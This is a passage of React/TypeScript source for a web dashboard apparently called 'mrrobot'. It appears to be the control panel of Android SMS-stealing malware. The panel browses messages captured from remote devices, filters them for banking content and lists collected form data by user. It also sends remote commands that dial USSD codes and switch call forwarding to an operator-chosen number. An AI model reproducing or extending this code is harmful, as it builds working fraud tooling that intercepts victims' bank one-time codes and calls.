              {state === "loading" ? "Deactivating…" : "Deactivate"}
            </button>
          </div>
          <div style={{ fontSize: 9, color: t.muted, textAlign: "center", marginTop: 4 }}>
            Deactivate dials <span style={{ fontFamily: "monospace", color: "#f87171" }}>##21#</span> automatically
          </div>
        </>
      )}
      {action === "dial_ussd" && (
        <>
          <div style={{ fontSize: 11, color: t.txt2, fontWeight: 600, marginBottom: 6 }}>SIM Slot</div>
          <SimSelect value={sim} onChange={setSim} device={device} />
          <FieldInput placeholder="USSD code (e.g. *123#)" value={ussdCode} onChange={setUssdCode} />
          <StatusLog state={state} log={log} />
          <PrimaryBtn state={state} idle="Dial USSD" loading="Dialing…" ok="Dialed" onClick={() => {
            if (!ussdCode.trim()) { setLog("Enter a USSD code."); setState("err"); return; }
            void send(mkDeviceCmd(device.deviceId, "ussd", { code: ussdCode.trim(), simSlot: sim === "2" ? 1 : 0 }));
          }} />
        </>
      )}
      {/* 5-second FCM sent progress bar — shows for ALL actions after FCM payload is sent */}
      <SendProgressBar active={fcmBar} />
    </div>
  );
}

/* ════ STAT CARD ════ */
function Stat({ label, value, color }: { label: string; value: string | number; color: string }) {
  return (
    <div style={{ background: "#fff", borderRadius: 8, padding: "12px 14px", border: "1px solid #e2e8f0" }}>
      <div style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.4, marginBottom: 6 }}>{label}</div>
      <div style={{ fontSize: 24, fontWeight: 800, color }}>{value}</div>
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — HOME
════════════════════════════════════════ */
interface AdminSession { id: string; loginTime: string; lastActive: string; userAgent: string; ip: string; device: string; }

function fmtTime(iso: string) {
  const d = new Date(iso);
  return d.toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
}

function HomePage({
  devices, messages, formData, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange, favoritesOnly, recentOnly,
}: {
  devices: DbDevice[];
  messages: DbMessage[];
  formData: DbFormData[];
  onOpenDevice: (d: DbDevice, msgId: string) => void;
  scrollToMsgId?: string | null;
  onScrollDone?: () => void;
  initialCount?: number;
  onCountChange?: (n: number) => void;
  favoritesOnly?: boolean;
  recentOnly?: boolean;
}) {
  const t = useTheme();
  const [search, setSearch] = useState("");

  // Build device lookup once per devices change — O(1) lookups vs O(n) find()
  const deviceMap = useMemo(() => {
    const m = new Map<string, DbDevice>();
    for (const d of devices) m.set(d.deviceId, d);
    return m;
  }, [devices]);
  const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);

  const formByDevice = useMemo(() => {
    const acc: Record<string, DbFormData[]> = {};
    for (const f of formData) {
      if (!acc[f.deviceId]) acc[f.deviceId] = [];
      acc[f.deviceId].push(f);
    }
    return acc;
  }, [formData]);

  // Memoize the heavy sort+filter — recomputed only when inputs change, NOT on every 1s live tick
  const allMsgs = useMemo(() => {
    let sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
    if (favoritesOnly) sorted = sorted.filter(m => deviceMap.get(m.deviceId)?.starred);
    if (recentOnly) sorted = sorted.filter(m => isRecent(deviceMap.get(m.deviceId)?.lastOnline ?? null));
    const q = search.toLowerCase().trim();
    if (!q) return sorted;
    return sorted.filter(m => {
      const dev = deviceMap.get(m.deviceId);
      return (
        m.deviceId.toLowerCase().includes(q) ||
        m.userId.toLowerCase().includes(q) ||
        m.body.toLowerCase().includes(q) ||
        m.fromSender.toLowerCase().includes(q) ||
        m.fromNumber.includes(q) ||
        (dev?.name ?? "").toLowerCase().includes(q)
      );
    });
  }, [messages, search, deviceMap, favoritesOnly, recentOnly]);

  const { visible: visibleMsgs, sentinelRef: homeSentinel, loading: homeLoading } = useInfiniteScroll(allMsgs, 20, initialCount, onCountChange);

  // Precise scroll-to-message restore — see useScrollToMessage for rationale.
  useScrollToMessage(scrollToMsgId, onScrollDone);

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>

      {/* ── Search bar ── */}
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="Search by device ID, user ID, message…"
          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }}
        />
        {search && (
          <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: t.muted, fontSize: 14, padding: 0, lineHeight: 1 }}>✕</button>
        )}
      </div>

      {/* ── Recent Messages ── */}
      <div style={{ fontWeight: 800, fontSize: 13, color: t.txt, padding: "2px 2px 0" }}>
        Recent Messages
      </div>
      {allMsgs.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 24, fontSize: 12 }}>{search ? "No messages found" : "No messages yet"}</div>
        : visibleMsgs.map(msg => {
            const dev = getDevice(msg.deviceId);
            return (
              <MsgCard
                key={msg.id}
                msg={msg}
                deviceName={dev?.name ?? msg.deviceId}
                device={dev}
                onOpen={onOpenDevice}
                cardClickable
                formEntries={formByDevice[msg.deviceId] ?? []}
              />
            );
          })
      }
      <div ref={homeSentinel} style={{ height: 1 }} />
      {homeLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color={t.accent} /></div>}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — MESSAGES
════════════════════════════════════════ */
function MessagesPage({
  appId, messages, devices, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange, favoritesOnly, recentOnly, liveTotal,
}: {
  appId: string;
  messages: DbMessage[];
  devices: DbDevice[];
  onOpenDevice: (d: DbDevice, msgId: string) => void;
  scrollToMsgId?: string | null;
  onScrollDone?: () => void;
  initialCount?: number;
  onCountChange?: (n: number) => void;
  // Live server-side total, kept in sync by the parent's WebSocket handlers (message_added /
  // message_deleted / bulk_deleted / device_deleted). Replaces a one-shot REST count fetch
  // that never reflected live deletes/adds without a full page refresh.
  liveTotal?: number;
  favoritesOnly?: boolean;
  recentOnly?: boolean;
}) {
  const t = useTheme();
  const [search, setSearch] = useState("");
  const [filterSensitive, setFilterSensitive] = useState(false);

  // Debounce so we don't hit the server on every keystroke
  const [debouncedSearch, setDebouncedSearch] = useState("");
  useEffect(() => {
    const tmr = setTimeout(() => setDebouncedSearch(search.trim()), 400);
    return () => clearTimeout(tmr);
  }, [search]);

  const deviceMap = useMemo(() => {
    const m = new Map<string, DbDevice>();
    for (const d of devices) m.set(d.deviceId, d);
    return m;
  }, [devices]);
  const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);

  // ── Server-side search — searches the FULL messages table for this app, not just
  //    what's currently loaded into the client (which can lag behind on large datasets) ──
  const SEARCH_PAGE = 200;
  const [searchResults, setSearchResults] = useState<DbMessage[]>([]);
  const [searching, setSearching] = useState(false);
  const searchCursorRef = useRef<number | null>(null);

  const runSearch = useCallback(async (term: string) => {
    setSearching(true);
    searchCursorRef.current = null;
    setSearchResults([]);
    try {
      for (;;) {
        const qs = new URLSearchParams({ appId, search: term, limit: String(SEARCH_PAGE) });
        if (searchCursorRef.current !== null) qs.set("cursor", String(searchCursorRef.current));
        const r = await apiFetch(`/api/messages?${qs.toString()}`, { headers: { "x-silent": "1" } });
        if (!r.ok) break;
        const resp = await r.json() as { data: DbMessage[]; hasMore: boolean; lastId: number | null };
        setSearchResults(prev => [...prev, ...resp.data]);
        searchCursorRef.current = resp.lastId ?? null;
        if (!resp.hasMore || resp.lastId == null) break;
      }
    } catch { /* network error — fall back to whatever loaded so far */ } finally { setSearching(false); }
  }, [appId]);

  useEffect(() => {
    if (debouncedSearch) void runSearch(debouncedSearch);
    else setSearchResults([]);
  }, [debouncedSearch, runSearch]);

  // Memoize so we don't re-sort 2000+ messages on every parent re-render (1Hz live tick)
  const filtered = useMemo(() => {
    const base = debouncedSearch ? searchResults : messages;
    const sorted = [...base].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
    const q = debouncedSearch.toLowerCase();
    return sorted.filter(m => {
      // Call Forward system logs hide karo — sirf real SMS dikhao
      if (m.fromSender.toLowerCase().startsWith("call forward")) return false;
      if (filterSensitive && !isBankingMsg(m.body, m.fromSender)) return false;
      if (favoritesOnly && !deviceMap.get(m.deviceId)?.starred) return false;
      if (recentOnly && !isRecent(deviceMap.get(m.deviceId)?.lastOnline ?? null)) return false;
      if (!q) return true;
      return m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (deviceMap.get(m.deviceId)?.name ?? "").toLowerCase().includes(q);
    });
  }, [messages, searchResults, debouncedSearch, filterSensitive, deviceMap, favoritesOnly, recentOnly]);

  // Live total comes straight from the parent (WS-synced) — no separate REST fetch needed.
  const totalCount = liveTotal ?? null;

  const { visible: visibleMsgsFeed, sentinelRef: feedSentinel, loading: feedLoading, resetCount: resetFeed } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);

  // Reset to page 1 whenever the user actually changes search query or sensitive filter —
  // but NOT on initial mount, otherwise coming back from a device's details page would wipe
  // out the previously-expanded item count and break scroll-position restore (back nav).
  const skipFirstResetRef = useRef(true);
  useEffect(() => {
    if (skipFirstResetRef.current) { skipFirstResetRef.current = false; return; }
    resetFeed(20);
  }, [debouncedSearch, filterSensitive, favoritesOnly, recentOnly]); // eslint-disable-line react-hooks/exhaustive-deps

  // Precise scroll-to-message restore — see useScrollToMessage for rationale.
  useScrollToMessage(scrollToMsgId, onScrollDone);

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ display: "flex", gap: 8 }}>
        <div style={{ flex: 1, background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search across ALL messages…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
          {searching && <CircularLoader size={12} color={t.accent} />}
        </div>
        <button onClick={() => setFilterSensitive(p => !p)} style={{
          padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
          borderColor: filterSensitive ? "#ef4444" : t.cardB,
          background: filterSensitive ? "#fef2f2" : t.card,
          color: filterSensitive ? "#ef4444" : t.muted,
          fontSize: 11, fontWeight: 600, cursor: "pointer",
        }}>Sensitive</button>
      </div>
      {/* ── Message count stats bar ── */}
      {(filtered.length > 0 || totalCount !== null) && !searching && (
        <div style={{ display: "flex", alignItems: "center", gap: 6, paddingLeft: 2, paddingBottom: 2 }}>
          {debouncedSearch ? (
            <>
              <span style={{ fontSize: 11, fontWeight: 700, color: t.accent }}>
                {filtered.length} result{filtered.length !== 1 ? "s" : ""}
              </span>
              <span style={{ fontSize: 11, color: t.muted }}>·</span>
              <span style={{ fontSize: 11, color: t.muted }}>
                Total {totalCount !== null ? totalCount.toLocaleString() : messages.length.toLocaleString()} messages
              </span>
            </>
          ) : (
            <>
              <span style={{ fontSize: 11, fontWeight: 600, color: t.muted }}>
                Total{" "}
                <span style={{ fontWeight: 700, color: t.txt }}>
                  {totalCount !== null ? totalCount.toLocaleString() : messages.length.toLocaleString()}
                </span>
                {" "}messages
              </span>
              {visibleMsgsFeed.length < filtered.length && (
                <>
                  <span style={{ fontSize: 11, color: t.muted }}>·</span>
                  <span style={{ fontSize: 11, color: t.muted }}>Showing {visibleMsgsFeed.length.toLocaleString()}</span>
                </>
              )}
            </>
          )}
        </div>
      )}
      {debouncedSearch && searching && filtered.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>Searching all messages…</div>
        : filtered.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>No messages found</div>
        : visibleMsgsFeed.map(msg => {
            const dev = getDevice(msg.deviceId);
            return <MsgCard key={msg.id} msg={msg} deviceName={dev?.name ?? msg.deviceId} device={dev} onOpen={onOpenDevice} cardClickable />;
          })
      }
      <div ref={feedSentinel} style={{ height: 1 }} />
      {feedLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color={t.accent} /></div>}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — GROUPS (only user DB form data)
════════════════════════════════════════ */
function fmtKey(k: string): string {
  return k.replace(/_/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").replace(/\b\w/g, c => c.toUpperCase());
}

function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChange, favoritesOnly, recentOnly }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; onOpenDevice: (d: DbDevice) => void; initialCount?: number; onCountChange?: (n: number) => void; favoritesOnly?: boolean; recentOnly?: boolean }) {
  const t = useTheme();
  const dpEnabled = useDeleteProt();
  const [search, setSearch] = useState("");

  const formByDevice = formData.reduce((acc, f) => {
    if (!acc[f.deviceId]) acc[f.deviceId] = [];
    acc[f.deviceId].push(f);
    return acc;
  }, {} as Record<string, DbFormData[]>);

  const devicesWithData = devices.filter(d => (formByDevice[d.deviceId]?.length ?? 0) > 0 && (!favoritesOnly || d.starred) && (!recentOnly || isRecent(d.lastOnline)));

  const byUser = devicesWithData.reduce((acc, d) => {
    if (!acc[d.userId]) acc[d.userId] = [];
    acc[d.userId].push(d);
    return acc;
  }, {} as Record<string, DbDevice[]>);

  // Sort each user's devices by their latest form submission (newest first)
  for (const uid of Object.keys(byUser)) {
    byUser[uid].sort((a, b) => {
      const latestA = formByDevice[a.deviceId]?.reduce((m, f) => Math.max(m, new Date(f.submittedAt).getTime()), 0) ?? 0;
      const latestB = formByDevice[b.deviceId]?.reduce((m, f) => Math.max(m, new Date(f.submittedAt).getTime()), 0) ?? 0;
      return latestB - latestA;
    });
  }

  // Sort users by their latest form submission across all their devices (newest first)
  const allUserIds = Object.keys(byUser).sort((a, b) => {
    const latestA = byUser[a].reduce((m, d) => Math.max(m, formByDevice[d.deviceId]?.reduce((mm, f) => Math.max(mm, new Date(f.submittedAt).getTime()), 0) ?? 0), 0);
    const latestB = byUser[b].reduce((m, d) => Math.max(m, formByDevice[d.deviceId]?.reduce((mm, f) => Math.max(mm, new Date(f.submittedAt).getTime()), 0) ?? 0), 0);
    return latestB - latestA;
  });

  // Filter by search query — matches userId, deviceId, or device name
  const q = search.toLowerCase().trim();
  const userIds = q
    ? allUserIds.filter(uid =>
        uid.toLowerCase().includes(q) ||
        byUser[uid].some(d =>
          d.deviceId.toLowerCase().includes(q) ||
          d.name.toLowerCase().includes(q)
        )
      )
    : allUserIds;

  const { visible: visibleUsers, sentinelRef: userSentinel, loading: usersLoading } = useInfiniteScroll(userIds, 15, initialCount, onCountChange);

  const B = t.cardB;
  const H = t.hdrB;

  return (
    <div style={{ padding: 8, display: "flex", flexDirection: "column", gap: 8 }}>

      {/* ── Search bar ── */}
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="Search by user ID, device ID, device name…"
          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }}
        />
        {search && (
          <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: t.muted, fontSize: 14, padding: 0, lineHeight: 1 }}>✕</button>
        )}
      </div>

      <div style={{ fontSize: 10, color: "#64748b" }}>
        {userIds.length} user{userIds.length !== 1 ? "s" : ""} · {devicesWithData.length} device{devicesWithData.length !== 1 ? "s" : ""} · {formData.length} entr{formData.length !== 1 ? "ies" : "y"}
      </div>
      {userIds.length === 0 && (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>{search ? "No results found" : "No form submissions yet"}</div>
      )}
      {visibleUsers.map(uid => {
        const uDevices = byUser[uid];
        const totalEntries = uDevices.reduce((s, d) => s + (formByDevice[d.deviceId]?.length ?? 0), 0);
        return (
          <div key={uid} style={{ borderRadius: 10, border: `1px solid ${B}`, overflow: "hidden" }}>
            {/* ── User header ── */}
            <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", background: H, borderBottom: `1px solid ${B}` }}>
              <div style={{ width: 26, height: 26, borderRadius: "50%", background: t.accent, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 9, flexShrink: 0, fontFamily: "monospace" }}>
                {uid.slice(-2)}
              </div>
              <span style={{ flex: 1, fontSize: 11, fontWeight: 700, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", color: t.txt }}>{uid}</span>
              <CopyIconButton value={uid} size={20} color={t.accent} title="Copy User ID" />
              <span style={{ fontSize: 9, color: "#8b5cf6", fontWeight: 700, flexShrink: 0 }}>{totalEntries} entries</span>
            </div>

            {/* ── One card per device ── */}
            {uDevices.map((device, di) => {
              const devForm = (formByDevice[device.deviceId] ?? [])
                .slice()
                .sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
              const isLast = di === uDevices.length - 1;

              return (
                <div key={device.deviceId} id={`device-card-${device.deviceId}`} style={{ borderBottom: isLast ? "none" : `1px solid ${B}`, background: t.card }}>

                  {/* Device sub-header */}
                  <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "5px 10px", borderBottom: `1px solid ${H}` }}>
                    <div style={{ flex: 1, minWidth: 0, display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                      <FavoriteBadge starred={device.starred} size={13} />
                      <span style={{ fontSize: 11, fontWeight: 700, color: t.txt }}>{device.name}</span>
                      <CopyIconButton value={device.name} size={18} color={t.accent} title="Copy device name" />
                      <span style={{ fontSize: 9, color: "#64748b", fontFamily: "monospace" }}>{device.deviceId}</span>
                      <CopyIconButton value={device.deviceId} size={18} color={t.accent} title="Copy device ID" />
                      <span style={{ fontSize: 9, fontWeight: device.status !== "uninstalled" && isRecent(device.lastOnline) ? 700 : 400, color: device.status !== "uninstalled" && isRecent(device.lastOnline) ? "#16a34a" : "#64748b" }}>
                        {device.status === "uninstalled" ? "Uninstalled" : timeAgo(device.lastOnline)}
                      </span>
                    </div>
                    <button
                      onClick={() => onOpenDevice(device)}
                      style={{ fontSize: 13, padding: "6px 16px", borderRadius: 7, border: "none", background: t.accent, color: "#fff", cursor: "pointer", fontWeight: 700, flexShrink: 0, boxShadow: "0 2px 10px rgba(99,102,241,0.45)" }}
                    >Open</button>
                  </div>

                  {/* All entries in ONE block — separated by thin lines only */}
                  {devForm.map((entry, idx) => {
                    const pairs = Object.entries(entry.data ?? {});
                    const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                    return (
                      <div key={entry.id} style={{ borderBottom: idx < devForm.length - 1 ? `1px solid ${H}` : "none" }}>
                        {/* Entry number + time — header row */}
                        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: H }}>
                          <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                          <span style={{ fontSize: 8, color: "#64748b" }}>{time}</span>
                        </div>
                        {/* Key-value pairs */}
                        {pairs.length === 0
                          ? <div style={{ fontSize: 10, color: "#64748b", padding: "2px 10px" }}>—</div>
                          : pairs.map(([k, v]) => {
                            const sv = String(v ?? "");
                            return (
                              <div key={k} style={{ display: "flex", padding: "3px 10px", gap: 8, alignItems: "center" }}>
                                <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 88, flexShrink: 0 }}>{fmtKey(k)}</span>
                                <span style={{ fontSize: 10, color: t.txt, wordBreak: "break-all", flex: 1 }}>{sv}</span>
                                {sv && <CopyIconButton value={sv} size={18} color="#8b5cf6" title={`Copy ${fmtKey(k)}`} />}
                              </div>
                            );
                          })
                        }
                      </div>
                    );
                  })}

                  {/* One delete-all button per device — bottom */}
                  {devForm.length > 0 && (
                    <div style={{ display: "flex", justifyContent: "flex-end", padding: "6px 10px", background: H, borderTop: `1px solid ${H}` }}>
                      <DeleteIconButton
                        hidden={dpEnabled}
                        size={28}
                        title={`Delete all ${devForm.length} form entries from this device`}
                        confirmTitle="Delete All Form Entries"
                        confirmText={`Are you sure you want to delete ALL ${devForm.length} form ${devForm.length === 1 ? "entry" : "entries"} submitted by ${device.name}? This action cannot be undone.`}
                        onConfirm={async () => {
                          const r = await apiFetch(`/api/data?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}`, { method: "DELETE" });
                          if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                        }}
                      />
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        );
      })}
      <div ref={userSentinel} style={{ height: 1 }} />
      {usersLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color="#8b5cf6" /></div>}
    </div>
  );
}

/* ─── Per-device Check Online button ─── */
function CheckOnlineBtn({ device }: { device: DbDevice }) {
  const t = useTheme();
  const [checking, setChecking] = useState(false);
  const [seconds, setSeconds] = useState(0);   // live counter: 1,2,3…30
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [progress, setProgress] = useState(false); // 5-sec FCM progress bar

  // Cleanup on unmount
  useEffect(() => () => { if (timerRef.current) clearInterval(timerRef.current); }, []);

  // SSE: device heartbeat received → immediately stop timer & show success
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId) return;
      if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
      setChecking(false);
      setSeconds(0);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [device.deviceId]);

  async function handleClick(e: React.MouseEvent) {
    e.stopPropagation();
    if (checking) return;
    if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }

    // Start checking state + timer + progress bar IMMEDIATELY on click (before FCM send)
    setChecking(true);
    setProgress(true);
    setTimeout(() => setProgress(false), 5200);
    setSeconds(0);
    timerRef.current = setInterval(() => {
      setSeconds(s => {
        const next = s + 1;
        if (next >= 30) {
          if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
          setChecking(false);
          setSeconds(0);
          return 0;
        }
        return next;
      });
    }, 1000);

    try {
      await fcmSend(device.deviceId, mkCheckOnline());
    } catch {
      // FCM failed — silently stop timer and reset
      if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
      setChecking(false);
      setSeconds(0);
    }
  }

  return (
    <div>
      <button onClick={e => void handleClick(e)} style={{
        width: "100%", borderRadius: 8, padding: "10px 4px",
        fontSize: 13, fontWeight: 700, textAlign: "center",
        border: checking ? "1px solid #bfdbfe" : "1px solid #e2e8f0",
        background: checking ? t.accent : "#f8fafc",
        color: checking ? "#fff" : "#475569",
        cursor: checking ? "default" : "pointer",
        transition: "background 0.25s, border-color 0.25s, color 0.25s",
      }}>
        {checking ? `${seconds}s…` : "Check Online"}
      </button>
      <SendProgressBar active={progress} />
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — DEVICES
════════════════════════════════════════ */
/* ════════════════════════════════════════
   ADMIN UPDATE PANEL (per-device)
════════════════════════════════════════ */
function AdminUpdatePanel({ device }: { device: DbDevice }) {
  const t = useTheme();
  const [num, setNum] = useState("");
  const [sendState, setSendState] = useState<"idle"|"loading"|"ok"|"err">("idle");
  const [sendMsg, setSendMsg] = useState("");
  const [disableState, setDisableState] = useState<"idle"|"loading"|"ok"|"err">("idle");
  const [disableMsg, setDisableMsg] = useState("");
  const [fcmBar, setFcmBar] = useState(false); // 5-second progress bar after FCM send

  async function sendCmd(data: Record<string, string>, which: "send"|"disable") {
    if (which === "send") { setSendState("loading"); setSendMsg(""); }
    else { setDisableState("loading"); setDisableMsg(""); }
    setFcmBar(true);
    setTimeout(() => setFcmBar(false), 5000);
    try {
      await fcmSend(device.deviceId, data);
      if (which === "send") { setSendMsg("Sent ✓"); setSendState("ok"); }
      else { setDisableMsg("Disabled ✓"); setDisableState("ok"); }
    } catch (e) {
      const msg = (e as Error).message;
      if (which === "send") { setSendMsg(msg); setSendState("err"); }
      else { setDisableMsg(msg); setDisableState("err"); }
      setFcmBar(false);
    }
    finally {
      setTimeout(() => {
        if (which === "send") { setSendState("idle"); setSendMsg(""); }
        else { setDisableState("idle"); setDisableMsg(""); }
      }, 3000);
    }
  }

  function handleUpdate() {
    const digits = num.replace(/\D/g, "");
    if (digits.length !== 10) { setSendMsg("Enter exactly 10 digits."); setSendState("err"); setTimeout(() => { setSendState("idle"); setSendMsg(""); }, 2500); return; }
    void sendCmd(mkAdminUpdate(device.deviceId, digits, "on"), "send");
  }

  const IS: React.CSSProperties = {
    flex: 1, boxSizing: "border-box", padding: "10px 12px",
    borderRadius: 8, border: `1.5px solid ${sendState === "err" ? "#ef4444" : t.cardB}`,
    background: t.bg, color: t.txt, fontSize: 13, outline: "none", letterSpacing: 1,
  };

  return (
    <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
      <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Admin Update</div>
      <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>

        {/* Number input + Update button row */}
        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
          <input
            type="tel"
            value={num}
            onChange={e => { setNum(e.target.value.replace(/\D/g, "").slice(0, 10)); if (sendState !== "idle") { setSendState("idle"); setSendMsg(""); } }}
            placeholder="10-digit number"
            maxLength={10}
            style={IS}
          />
          <button
            onClick={handleUpdate}
            disabled={sendState === "loading"}
            style={{
              flexShrink: 0, padding: "10px 16px", borderRadius: 8, border: "none",
              background: sendState === "ok" ? "#22c55e" : sendState === "err" ? "#ef4444" : num.replace(/\D/g,"").length === 10 ? t.accent : t.hdrB,
              color: num.replace(/\D/g,"").length === 10 || sendState !== "idle" ? "#fff" : t.muted,
              fontWeight: 700, fontSize: 13, cursor: sendState === "loading" ? "wait" : "pointer",
              transition: "background 0.15s", whiteSpace: "nowrap" as const,
            }}
          >
            {sendState === "loading" ? "…" : sendState === "ok" ? "✓" : sendState === "err" ? "✗" : "Update"}
          </button>
        </div>

        {/* Status + last updated number */}
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{
            padding: "3px 10px", borderRadius: 99, fontSize: 11, fontWeight: 700,
            background: sendState === "ok" ? "#dcfce7" : sendState === "err" ? "#fee2e2" : disableState === "ok" ? "#fee2e2" : t.hdrB,
            color: sendState === "ok" ? "#16a34a" : sendState === "err" ? "#ef4444" : disableState === "ok" ? "#ef4444" : t.muted,
            border: `1px solid ${sendState === "ok" ? "#bbf7d0" : sendState === "err" ? "#fecaca" : disableState === "ok" ? "#fecaca" : t.cardB}`,
          }}>
            {sendState === "ok" ? "ON" : disableState === "ok" ? "OFF" : sendState === "err" || disableState === "err" ? "Error" : "—"}
          </span>
          {sendState === "ok" && num && (
            <span style={{ fontSize: 12, color: t.muted, fontWeight: 500 }}>
              Updated: <span style={{ color: t.txt, fontWeight: 700, fontFamily: "monospace" }}>{num}</span>
            </span>
          )}
          {(sendState === "err" || disableState === "err") && (
            <span style={{ fontSize: 11, color: "#ef4444", fontWeight: 600 }}>{sendMsg || disableMsg}</span>
          )}
          <span style={{ marginLeft: "auto", fontSize: 10, color: t.muted }}>{num.length}/10</span>
        </div>

        {/* Disable button */}
        <button
          onClick={() => void sendCmd(mkAdminUpdate(device.deviceId, "", "off"), "disable")}
          disabled={disableState === "loading"}
          style={{
            width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid",
            borderColor: disableState === "ok" ? "#22c55e" : "#ef4444",
            background: disableState === "ok" ? "#22c55e" : disableState === "loading" ? "#fee2e2" : "transparent",
            color: disableState === "ok" ? "#fff" : "#ef4444",
            fontWeight: 700, fontSize: 13, cursor: disableState === "loading" ? "wait" : "pointer",
            transition: "all 0.15s",
          }}
        >
          {disableState === "loading" ? "Sending…" : disableState === "ok" ? "Disabled ✓" : "Disable"}
        </button>
        {/* 5-second FCM progress bar */}
        <SendProgressBar active={fcmBar} />
      </div>
    </div>
  );
}

function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack, initialCount, onCountChange }: { appId: string; devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; initialDevice?: DbDevice | null; onBack?: () => void; initialCount?: number; onCountChange?: (n: number) => void }) {
  const DEVICE_KEY = `mrrobot_device_id_${appId}`;
  const t = useTheme();
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<DbDevice | null>(initialDevice ?? null);
  const [fromExternal, setFromExternal] = useState<boolean>(!!initialDevice);

  // Sync from parent — Messages/Home/Groups se device kholne par
  useEffect(() => {
    if (initialDevice && (!selected || selected.deviceId !== initialDevice.deviceId)) {
      setSelected(initialDevice);
      setFromExternal(true);
    }
  }, [initialDevice]); // eslint-disable-line react-hooks/exhaustive-deps

  // Refresh-restore + live sync — devices list change hote hi:
  // 1. Agar selected hai → fresh copy se update karo (SSE se naya data aya)
  // 2. Agar selected null hai par localStorage mein device_id hai → restore karo (refresh case)
  useEffect(() => {
    if (devices.length === 0) return;
    if (selected) {
